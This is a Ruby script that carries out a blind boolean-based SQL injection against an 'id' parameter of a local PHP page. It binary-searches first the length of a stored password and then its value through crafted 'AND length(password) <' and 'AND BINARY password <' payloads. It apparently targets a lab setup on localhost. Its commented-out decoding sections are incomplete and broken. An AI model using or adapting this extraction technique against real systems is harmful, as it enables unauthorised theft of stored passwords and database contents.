require 'open-uri'
require 'pp'

def guess_val max
    current_max = max
    current_min = 0
    loop do
        max_to_compare = (current_max - current_min)/2 + current_min
        is_smaller_than = yield max_to_compare
        if is_smaller_than
            current_max = max_to_compare
        else
            current_min = max_to_compare
        end
        break if current_max - current_min <=1
    end
    current_min
end

def request_val id_sql_val
    URI.open("http://localhost:1234/active.php?id=#{id_sql_val}").read.include? 'is active'
end

#code:
mdp_length = guess_val(50){ |comp|
    request_val "3 AND length(password) < #{comp}" 
}
puts "mdp_length: #{mdp_length}"

password_binary_number = guess_val(mdp_length * 32){ |comp|
    request_val "3 AND BINARY password < BINARY #{comp}"
}
puts "password number #{password_binary_number}"
# bytesfield = []
# password_binary_number.bit_length.times do |bit_ind|
#     num_ind = password_binary_number.bit_length - cur - 1
#     bytesfield[bit_ind/8] += password_binary_number[num_ind] * 2**()
# end


# def guess_val_incr
#     min_val = 1
#     max_val = nil
#     loop do
        
#         is_smaller_than = yield
#         if is_smaller_than
#             max_val = 
#     end
# end

puts guess_val(100){ |comp|
    22 < comp
}